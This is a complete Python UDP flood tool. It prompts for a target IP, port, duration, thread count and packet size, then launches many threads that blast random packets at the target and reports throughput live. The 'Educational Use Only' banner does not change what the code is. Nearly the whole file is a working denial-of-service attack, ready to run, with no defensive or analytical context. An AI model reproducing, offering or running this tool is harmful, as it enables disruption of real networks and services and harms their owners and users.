#!/usr/bin/env python3
import socket
import random
import threading
import time
import sys
from datetime import datetime

print("\033[91m" + r"""
   ___  __   __  ____    ____ 
  / _ \/ /  / / / __ \  / __/
 / // / /__/ /__/ /_/ / / _/  
/____/____/____/\____/ /___/   UDP Flood Tool (Educational Use Only)
""" + "\033[0m")

# --------------------- USER INPUT ---------------------
print("\033[93mEnter attack parameters:\033[0m\n")

while True:
    target_ip = input("Target IP       : ").strip()
    if target_ip:
        break
    print("IP cannot be empty!")

while True:
    try:
        target_port = int(input("Target Port     : ").strip())
        if 1 <= target_port <= 65535:
            break
        else:
            print("Port must be between 1 and 65535")
    except:
        print("Please enter a valid number")

while True:
    try:
        duration = int(input("Duration (seconds, 0 = unlimited) : ").strip())
        if duration >= 0:
            break
    except:
        print("Please enter a valid number")

while True:
    try:
        threads = int(input("Threads (100-2000 recommended)    : ").strip())
        if threads > 0:
            break
    except:
        print("Please enter a valid number")

while True:
    try:
        packet_size = int(input("Packet size in bytes (512-65500) : ").strip())
        if 10 <= packet_size <= 65500:
            break
        else:
            print("Size must be between 10 and 65500")
    except:
        print("Please enter a valid number")

print("\n\033[92mStarting attack in 3 seconds... (Ctrl+C to stop)\033[0m")
time.sleep(3)

# --------------------- ATTACK CODE ---------------------
sent_packets = 0
lock = threading.Lock()
stop_event = threading.Event()

def udp_attack():
    global sent_packets
    payload = random._urandom(packet_size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target_ip, target_port))
            with lock:
                sent_packets += 1
        except:
            pass  # silently continue on error

def status_printer():
    global sent_packets
    start_time = datetime.now()
    last_count = 0
    
    while not stop_event.is_set():
        time.sleep(1)
        with lock:
            current = sent_packets
        elapsed = (datetime.now() - start_time).total_seconds()
        pps = int(current - last_count)
        total_gb = (current * packet_size) / (1024**3)
        print(f"\r\033[96m[{datetime.now().strftime('%H:%M:%S')}] Sent: {current:,} packets | "
              f"{pps:,} pps | {total_gb:.3f} GB | Threads: {threads}\033[0m", end="")
        last_count = current

# Start status thread
status_thread = threading.Thread(target=status_printer, daemon=True)
status_thread.start()

# Start attack threads
print(f"\n\033[91mATTACK STARTED → {target_ip}:{target_port}\033[0m\n")
for i in range(threads):
    t = threading.Thread(target=udp_attack)
    t.daemon = True
    t.start()

# Duration handler
try:
    if duration > 0:
        time.sleep(duration)
    else:
        while True:
            time.sleep(1)
except KeyboardInterrupt:
    pass
finally:
    stop_event.set()
    total_gb = (sent_packets * packet_size) / (1024**3)
    print(f"\n\n\033[92mAttack finished!")
    print(f"Total packets sent : {sent_packets:,}")
    print(f"Total data sent    : {total_gb:.3f} GB\033[0m\n")
